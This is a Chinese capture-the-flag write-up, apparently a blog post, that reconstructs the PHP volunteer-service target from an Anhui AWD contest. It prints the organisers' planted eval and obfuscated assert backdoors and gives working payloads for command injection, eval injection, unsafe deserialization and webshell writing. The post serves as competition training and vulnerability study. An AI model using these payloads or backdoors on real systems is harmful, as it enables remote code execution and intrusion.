#  安徽省网络攻防赛AWD-志愿者服务系统赛后复现  
H1ck
                    H1ck  H1sec   2026-10-19 05:40  
  
   
  
幻影忍者前情提要：  
  
    被打成筛子了，ctf0分，awd零分，果然还是不能太依靠工具和ai。  
  
     awd给了三台靶机，一台是搭建的志愿者服务系统，看起来ai味好浓，一台是pwn，还有一台是wordpress 8版的  
  
这里我们主要分析志愿者服务系统，通过代码审计。分析一些比较高危的漏洞  
# 志愿者服务系统  
### 出题人的留的后门：  
  
1：org/smarty/Autofoucer.php  
  
```
<?phpeval(get_defined_vars()['_GET']['cmd']);?>等价于eval($_GET['cmd']);
```  
  
  
这个一眼木马，不过多赘述  
  
2.include/point_settle.php  
  
```
function baseline() {        return 96;    }function offsets() {   return array(1, 19, 19, 5, 18, 20);    }}
```  
  
  
这个是一个后门  
  
```
97 115 115 101 114 116  =>  assert具体调用return @array_map($op, array($packet));代入 $op = "assert"、$packet = $_POST['settle_token']：array_map("assert", array($_POST['settle_token']));等价于assert($_POST['settle_token']);
```  
  
### 第一处命令执行：  
  
index.php  
  
```
<?php$c=isset($_GET['c'])?$_GET['c']:'User';$a=isset($_GET['a'])?$_GET['a']:'Index';$obj=run_c($c);run_a($obj,$a);?>
```  
  
  
原理：  
  
```
eval('$obj->'.$action.'();');
```  
  
  
POC  
  
```
curl -sG "http://127.0.0.1:7878/index.php"  --data-urlencode "c=User"  --data-urlencode 'a=Index();system($_GET[1]);//'  --data-urlencode "1=id"
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/LYZsy3PMsndMZUIwfBN27e7Hic8YMibsL3ETBRxuzy59VjZKAOOiaC3AHvfu9KrMwfrI7xhLibFOvpZwQYia2R2AiaXefx7xUwJkT4vXDRUbuJ4aU/640?wx_fmt=png&from=appmsg "")  
  
  
### 第二处命令执行  
  
/lib/User.php  
  
```
function ping(){    	$host = $_POST['host'];        system("ping -c $host");    }}?>
```  
  
  
没有做过滤，也没有做鉴权处理  
  
poc  
  
```
POST /index.php?c=User&a=pingHost: 127.0.0.1:7878host=1|id
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LYZsy3PMsnepJSmqJLicnIWLuE88v8H1lecRg0a4tnJuB7SKDxpOGSZ95gPQhY4tpIWMo9QwTyzgGOjtiaWzf5ic86jibxpO5kZwU8eDSZsG89c/640?wx_fmt=png&from=appmsg "")  
  
  
### 第三处命令执行  
  
  
common/task.php  
  
```
    function __destruct(){        if (in_array($this->method, array("probe"))) {            call_user_func_array(array($this, $this->method), $this->args);        }    }    function probe($host){        system("ping -c 2 $host");
```  
  
  
__wakeup()  
 会去掉空格并做 mysql_escape_string()  
，但不会拦截; ，所以可以直接执行127.0.0.1;id  
  
POC  
  
```
POST /common/task.php HTTP/1.1Host: 127.0.0.1:7878task_data=O:8:"TaskNode":2:{s:16:"\0TaskNode\0method";s:5:"probe";s:14:"\0TaskNode\0args";a:1:{i:0;s:12:"127.0.0.1;id";}}或者base64编码：task_data=Tzo4OiJUYXNrTm9kZSI6Mjp7czoxNjoiAFRhc2tOb2RlAG1ldGhvZCI7czo1OiJwcm9iZSI7czoxNDoiAFRhc2tOb2RlAGFyZ3MiO2E6MTp7aTowO3M6MTI6IjEyNy4wLjAuMTtpZCI7fX0=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LYZsy3PMsnchnA1qvicNZich08DEqNeNk4gld0oxeDvJqyJKibfq2HHypB2nxgC3VAfaVN9BeB8ibQsGbgWYE9B1ibrpr5J1HXKDZ5vKGF6Ymo5A/640?wx_fmt=png&from=appmsg "")  
  
### 第四处命令执行  
  
common/archive.php  
  
```
class TimeArchive{    var $content = '';    function __wakeup(){    	$fp = fopen("log.php","w") ;    	fwrite($fp,$this->content);    	fclose($fp);    }}if ( !preg_match( '/^([adObis]):/', $data, $badions ) )    return false;case 'O':    if ( preg_match( "/^{$badions[1]}:[0-9]+:.*[;}]\$/s", $data ) )        return true;if(isset($_POST['name'])){    $post_data=$_POST['name'];    if(is_serialized($post_data)){    echo $post_data;    unserialize($post_data);}
```  
  
  
对象注入任意写，只检查是否以：a: o: s:等开头，所以只要长得像是序列化对象就会被反序列化  
  
POC：  
  
```
POST /common/archive.php HTTP/1.1Host: 127.0.0.1:7878O:11:"TimeArchive":1:{s:7:"content";s:25:"<?php system($_GET[0]);?>";}
```  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LYZsy3PMsnd42TgIYLwhBtYicF2mYVl8J3K1rDOCfhM8nibmrH3eruO1yocUwNcKttvGKjQQyQQRojHburS5iaRxqwv8j4XQR16ClibdvonKawA/640?wx_fmt=png&from=appmsg "")  
  
写入了common/log.php中  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/LYZsy3PMsncKmAyhUEWFYXfkC5r1ZKianXGicwoM0antamKGNFsWnicHMmKpoxHZscf6vMwKEoklTvG8mLX9sOKiaw3mWB5W0yD2wduQNFTVxPw/640?wx_fmt=png&from=appmsg "")  
  
  
